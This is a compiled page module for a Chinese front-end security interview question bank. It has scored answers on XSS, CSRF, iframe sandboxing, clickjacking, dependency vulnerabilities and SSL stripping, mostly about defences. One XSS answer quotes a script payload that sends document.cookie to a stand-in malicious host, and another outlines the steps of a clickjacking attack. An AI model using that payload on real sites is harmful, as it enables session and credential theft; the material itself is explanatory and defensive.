import{_ as r,c as l,a0 as o,j as a,a as t,t as i,o as c}from"./chunks/framework.Canm8p3M.js";const m=JSON.parse('{"title":"前端安全","description":"","frontmatter":{},"headers":[],"relativePath":"src/questions/front-safety/1_前端安全.md","filePath":"src/questions/front-safety/1_前端安全.md","lastUpdated":1735555615000}'),d={name:"src/questions/front-safety/1_前端安全.md"};function s(n,e,h,u,b,q){return c(),l("div",null,[e[4]||(e[4]=o('<h1 id="前端安全" tabindex="-1">前端安全 <a class="header-anchor" href="#前端安全" aria-label="Permalink to &quot;前端安全&quot;">​</a></h1><h2 id="xss-攻击" tabindex="-1">XSS 攻击 <a class="header-anchor" href="#xss-攻击" aria-label="Permalink to &quot;XSS 攻击&quot;">​</a></h2><h4 id="类型-基础" tabindex="-1">类型：<code>基础</code> <a class="header-anchor" href="#类型-基础" aria-label="Permalink to &quot;类型：`基础`&quot;">​</a></h4><h4 id="级别-w3、w4、w5、w6" tabindex="-1">级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code> <a class="header-anchor" href="#级别-w3、w4、w5、w6" aria-label="Permalink to &quot;级别：`W3`、`W4`、`W5`、`W6`&quot;">​</a></h4><h4 id="解答-3-分" tabindex="-1">解答（3 分） <a class="header-anchor" href="#解答-3-分" aria-label="Permalink to &quot;解答（3 分）&quot;">​</a></h4><ul><li><strong>:1</strong> XSS（Cross Site Scripting，跨站脚本），即攻击者往 Web 页面里嵌入恶意的客户端脚本，当用户浏览此网页时，脚本就会在用户的浏览器上执行，进而达到攻击者的目的。【获取用户的 Cookie、导航到恶意网站、携带木马】</li><li><strong>:2</strong> 防御：</li></ul><blockquote><p>1、对输入和 URL 参数进行过滤，过滤掉会导致脚本执行的相关内容。<br> 2、对动态输出到页面的内容进行 html 编码，使脚本无法在浏览器中执行。</p></blockquote><h2 id="csrf-攻击" tabindex="-1">CSRF 攻击 <a class="header-anchor" href="#csrf-攻击" aria-label="Permalink to &quot;CSRF 攻击&quot;">​</a></h2><h4 id="类型-基础-1" tabindex="-1">类型：<code>基础</code> <a class="header-anchor" href="#类型-基础-1" aria-label="Permalink to &quot;类型：`基础`&quot;">​</a></h4><h4 id="级别-w3、w4、w5、w6-1" tabindex="-1">级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code> <a class="header-anchor" href="#级别-w3、w4、w5、w6-1" aria-label="Permalink to &quot;级别：`W3`、`W4`、`W5`、`W6`&quot;">​</a></h4><h4 id="解答-5-分" tabindex="-1">解答（5 分） <a class="header-anchor" href="#解答-5-分" aria-label="Permalink to &quot;解答（5 分）&quot;">​</a></h4><ul><li><strong>:1</strong> CSRF（Cross Site Request Forgery，跨站请求伪造），即在别的站点伪造了一个请求，在受害者访问一个网站时，其 cookie 还没有过期的情况下，攻击者伪造一个链接地址发送受害者并欺骗让其点击，从而形成 CSRF 攻击。</li><li><strong>:4</strong> 防御：</li></ul><blockquote><p>1、验证 HTTP 的 Referer 字段。<br> 2、在请求地址中添加 token 并验证。<br> 3、在 HTTP 头中自定义属性并验证。<br> 4、涉及到数据修改操作严格使用 post 请求而不是 get 请求。</p><blockquote><p>get 的 URL 会被放在浏览器历史和 WEB 服务器日志里面，如果把关键数据放在 get 里面，被人偷窥了浏览器，会造成数据泄露。而 post 日志没有记录，也不会保留 URL，只要数据库服务器不被入侵，基本还是安全的。</p></blockquote></blockquote><h2 id="iframe-风险" tabindex="-1">iframe 风险 <a class="header-anchor" href="#iframe-风险" aria-label="Permalink to &quot;iframe 风险&quot;">​</a></h2><h4 id="类型-基础-2" tabindex="-1">类型：<code>基础</code> <a class="header-anchor" href="#类型-基础-2" aria-label="Permalink to &quot;类型：`基础`&quot;">​</a></h4><h4 id="级别-w3、w4、w5、w6-2" tabindex="-1">级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code> <a class="header-anchor" href="#级别-w3、w4、w5、w6-2" aria-label="Permalink to &quot;级别：`W3`、`W4`、`W5`、`W6`&quot;">​</a></h4><h4 id="解答-2-分" tabindex="-1">解答（2 分） <a class="header-anchor" href="#解答-2-分" aria-label="Permalink to &quot;解答（2 分）&quot;">​</a></h4><ul><li><strong>:1</strong> 前端页面需要用到第三方提供的页面组件，通常会以 iframe 的方式引入，比如广告插件等。这些第三方提供的插件可以运行 js 脚本、flash 插件等，破坏用户体验。</li><li><strong>:1</strong> 防御：</li></ul><blockquote><p>iframe 中有一个叫做 sandbox 的安全属性，通过它可以对 iframe 的行为进行各种限制，充分实现“最小权限”原则。</p></blockquote><h2 id="点击劫持" tabindex="-1">点击劫持 <a class="header-anchor" href="#点击劫持" aria-label="Permalink to &quot;点击劫持&quot;">​</a></h2><h4 id="类型-基础-3" tabindex="-1">类型：<code>基础</code> <a class="header-anchor" href="#类型-基础-3" aria-label="Permalink to &quot;类型：`基础`&quot;">​</a></h4><h4 id="级别-w3、w4、w5、w6-3" tabindex="-1">级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code> <a class="header-anchor" href="#级别-w3、w4、w5、w6-3" aria-label="Permalink to &quot;级别：`W3`、`W4`、`W5`、`W6`&quot;">​</a></h4><h4 id="解答-6-分" tabindex="-1">解答（6 分） <a class="header-anchor" href="#解答-6-分" aria-label="Permalink to &quot;解答（6 分）&quot;">​</a></h4><ul><li><strong>:1</strong> 通过 iframe 使用别人提供的内容时，自己的页面也可能正在被不法分子放到他们精心构造的 iframe 中，进行点击劫持攻击。这是一种欺骗性强、用户参与高的攻击。</li><li><strong>:2</strong> 通常的攻击步骤是这样的：</li></ul><blockquote><p>1、攻击者构造一个诱导用户点击的内容，比如页面小游戏。<br> 2、将我们的页面放入到 iframe 当中。<br> 3、利用 z-index 等 CSS 样式将这个 iframe 叠加到小游戏的垂直方向的正上方。<br> 4、把 iframe 设置为100%透明度。<br> 5、受害者访问到这个页面后，肉眼看到的是一个小游戏，如果受到诱导进行了点击的话，实际上点击到的却是 iframe 中的我们自己的页面。</p></blockquote><ul><li><strong>:1</strong> 危害：</li></ul><blockquote><p>攻击者利用了受害者的用户身份，在其不知情的情况下进行一些操作。如果是删除某个重要文件记录，或者窃取敏感信息，那么造成的危害就难以承受。</p></blockquote><ul><li><strong>:2</strong> 防御：</li></ul><blockquote><p>1、使用 X-Frame-Options：DENY 这个 HTTP Header 来明确的告知浏览器，不要把当前HTTP响应中的内容在HTML Frame 中显示出来。 2、判断当前页面是否被嵌入到 iframe 中。</p></blockquote><h2 id="第三方依赖包带来的问题" tabindex="-1">第三方依赖包带来的问题 <a class="header-anchor" href="#第三方依赖包带来的问题" aria-label="Permalink to &quot;第三方依赖包带来的问题&quot;">​</a></h2><h4 id="类型-基础-4" tabindex="-1">类型：<code>基础</code> <a class="header-anchor" href="#类型-基础-4" aria-label="Permalink to &quot;类型：`基础`&quot;">​</a></h4><h4 id="级别-w3、w4、w5、w6-4" tabindex="-1">级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code> <a class="header-anchor" href="#级别-w3、w4、w5、w6-4" aria-label="Permalink to &quot;级别：`W3`、`W4`、`W5`、`W6`&quot;">​</a></h4><h4 id="解答-2-分-1" tabindex="-1">解答（2 分） <a class="header-anchor" href="#解答-2-分-1" aria-label="Permalink to &quot;解答（2 分）&quot;">​</a></h4><ul><li><p><strong>:1</strong> 现在绝大多数的开发都是在借助开发框架和各种类库进行快速开发。这样做虽然方便快速，但是与此同时也存在安全风险，如果这些来自第三方的代码有安全漏洞，那么对应用整体的安全性依然会造成严峻的挑战。 比如 Node.js 有一些已知的安全漏洞，比如 CVE-2017-11499，可能导致前端应用受到 DoS 攻击。</p></li><li><p><strong>:1</strong> 防御：</p></li></ul><blockquote><p>使用 NSP(Node Security Platform)、Snyk 等等这类工具。</p></blockquote><h2 id="https-存在的风险" tabindex="-1">https 存在的风险 <a class="header-anchor" href="#https-存在的风险" aria-label="Permalink to &quot;https 存在的风险&quot;">​</a></h2><h4 id="类型-基础-5" tabindex="-1">类型：<code>基础</code> <a class="header-anchor" href="#类型-基础-5" aria-label="Permalink to &quot;类型：`基础`&quot;">​</a></h4><h4 id="级别-w3、w4、w5、w6-5" tabindex="-1">级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code> <a class="header-anchor" href="#级别-w3、w4、w5、w6-5" aria-label="Permalink to &quot;级别：`W3`、`W4`、`W5`、`W6`&quot;">​</a></h4><h4 id="解答-4-分" tabindex="-1">解答（4 分） <a class="header-anchor" href="#解答-4-分" aria-label="Permalink to &quot;解答（4 分）&quot;">​</a></h4><ul><li><strong>:1</strong> 即使是服务器端开启了 https，也还是存在安全隐患，黑客可以利用 SSL Stripping 这种攻击手段，强制让 https 降级回 http，从而继续进行中间人攻击。</li><li><strong>:2</strong> 过程:</li></ul><blockquote><p>1、用户在浏览器里输入 URL 的时候往往不是从 https:// 开始的，而是直接从域名开始输入；<br> 2、随后浏览器向服务器发起 http 通信;<br> 3、攻击者把服务器端返回的跳转到 https 页面的响应拦截了，并且代替客户端和服务器端进行后续的通信。</p></blockquote><ul><li><strong>:1</strong> 防御：</li></ul><blockquote><p>使用 HSTS（HTTP Strict Transport Security），通过 HTTP Header 以及一个预加载的清单，来告知浏览器在和网站进行通信的时候强制性使用 HTTPS，而不是通过明文的HTTP进行通信。 并且当遇到证书或者链接不安全的时候，则首先警告用户，并且不再让用户继续进行不安全的通信。</p></blockquote><h2 id="什么是跨站脚本攻击-xss-如何防范" tabindex="-1">什么是跨站脚本攻击（XSS）？如何防范？ <a class="header-anchor" href="#什么是跨站脚本攻击-xss-如何防范" aria-label="Permalink to &quot;什么是跨站脚本攻击（XSS）？如何防范？&quot;">​</a></h2><h4 id="类型-基础-6" tabindex="-1">类型：<code>基础</code> <a class="header-anchor" href="#类型-基础-6" aria-label="Permalink to &quot;类型：`基础`&quot;">​</a></h4><h4 id="级别-w1、w2、w3、w4、w5、w6" tabindex="-1">级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code> <a class="header-anchor" href="#级别-w1、w2、w3、w4、w5、w6" aria-label="Permalink to &quot;级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`&quot;">​</a></h4><h4 id="解答-9-分" tabindex="-1">解答（9 分） <a class="header-anchor" href="#解答-9-分" aria-label="Permalink to &quot;解答（9 分）&quot;">​</a></h4>',47)),a("details",null,[a("ul",null,[e[3]||(e[3]=o("<li><p><strong>2：</strong> 跨站脚本攻击（XSS）是一种常见的网络安全漏洞。它允许攻击者将恶意脚本（通常是 JavaScript，但也可以是其他客户端脚本语言，如 VBScript）注 入到目标网站中。这些恶意脚本在用户的浏览器中执行，因为浏览器会把它当作正常的脚本代码来解析。例如： 一个存在 XSS 漏洞的网站有一个评论功能。攻击者在评论框中输入一段包含恶意 JavaScript 代码的评论，如 <code>&lt;script&gt;document.location = &#39;http://malicious - site.com?cookie=&#39; + document.cookie&lt;/script&gt;</code>。当其他用户访问包含这条评论 的页面时，他们的浏览器会执行这段脚本。这段脚本会获取用户的浏览器 cookie 信息（其中可能包含用户的登录凭证等敏感信息），并将其发送到攻击者指定的恶意 网站<code>（http://malicious - site.com）</code>。</p></li><li><p><strong>1：</strong> 输入验证和过滤：<br>  对用户输入进行严格验证：在接收用户输入的地方（如表单提交、URL 参数等），要验证输入的内容是否符合预期的格式。例如，如果是一个只允许输入数字的字段，要检查输入是否真的是数字。  过滤特殊字符：对于可能包含脚本代码的字符进行过滤。例如，对&lt;、&gt;、&amp;、&quot;、&#39;等 HTML 特殊字符进行转义。在 JavaScript 中，可以使用encodeURIComponent()函数对用户输入的 URL 参数进行编码，在服务器端也可以使用相应的函数来处理。例如在 PHP 中，使用htmlspecialchars()函数来转义 HTML 中的特殊字符，这样可以防止用户输入的内容被当作 HTML 标签或脚本解析。</p></li><li><p><strong>2：</strong> 输出编码：<br>  根据输出上下文进行编码：当把用户输入的数据输出到 HTML 页面时，要根据输出的位置进行合适的编码。如果是输出到 HTML 标签内部的文本内容，应该使 用 HTML 实体编码。例如，<code>将&lt;转义为&amp;lt;，&gt;转义为&amp;gt;</code>。如果是输出到 JavaScript 代码中的变量，要使用 JavaScript 编码，如对引号等进行转义，以防止代码注入。</p></li><li><p><strong>2：</strong> 内容安全策略（CSP）：<br>  设置策略限制脚本来源：CSP 是一种浏览器安全机制，它允许网站所有者定义哪些来源的脚本可以在页面上执行。例如，可以在服务器的响应头中设 置<code>Content-Security-Policy: default- src&#39;self&#39;; script-src&#39;self&#39; https://trusted-scripts.com</code>。这意味着默认情况下，只允许来自当前网 站（self）的资源加载，而脚本可以来自当前网站和<code>https://trusted - scripts.com</code>。这样可以防止外部恶意脚本的注入。<br>  阻止内联脚本和 eval () 函数的滥用：CSP 还可以设置script-src指令为&#39;nonce-value&#39;或&#39;hash-value&#39;来限制内联脚本的执行。内联脚本是直接写在 HTML 标签中的脚本，如<code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code>，这种形式的脚本容易被攻击者利用。同时，限制eval()函数的使用，因为eval()可以动态地执行字符串形式的 JavaScript 代码， 攻击者可能会利用它来执行恶意代码。</p></li>",4)),a("li",null,[a("p",null,[e[0]||(e[0]=a("strong",null,"2：",-1)),e[1]||(e[1]=t(" 使用安全的库和框架：利用内置的安全机制，许多现代的前端框架（如 React、Vue.js）都有内置的安全机制来防止 XSS。例如，React 会自动对输出到 DOM 中的内容进行转义，除非你使用dangerouslySetInnerHTML属性（这种情况下开发者需要自己确保内容是安全的）。Vue.js 也有类似的机制，在使用插值表达式")),a("code",null,"（"+i()+"）",1),e[2]||(e[2]=t("时会对内容进行 HTML 转义，防止脚本注入。"))])])])]),e[5]||(e[5]=o('<h2 id="前端如何防止点击劫持" tabindex="-1">前端如何防止点击劫持？ <a class="header-anchor" href="#前端如何防止点击劫持" aria-label="Permalink to &quot;前端如何防止点击劫持？&quot;">​</a></h2><h4 id="类型-基础-7" tabindex="-1">类型：<code>基础</code> <a class="header-anchor" href="#类型-基础-7" aria-label="Permalink to &quot;类型：`基础`&quot;">​</a></h4><h4 id="级别-w1、w2、w3、w4、w5、w6-1" tabindex="-1">级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code> <a class="header-anchor" href="#级别-w1、w2、w3、w4、w5、w6-1" aria-label="Permalink to &quot;级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`&quot;">​</a></h4><h4 id="解答-2-分-2" tabindex="-1">解答（2 分） <a class="header-anchor" href="#解答-2-分-2" aria-label="Permalink to &quot;解答（2 分）&quot;">​</a></h4><ul><li><strong>2：</strong> 可以使用 X-Frame-Options 响应头来限制页面能否被嵌套在 iframe 中，例如设置为 DENY 禁止任何页面嵌套，或者 SAMEORIGIN 只允许同源页面嵌套。</li></ul>',5))])}const W=r(d,[["render",s]]);export{m as __pageData,W as default};
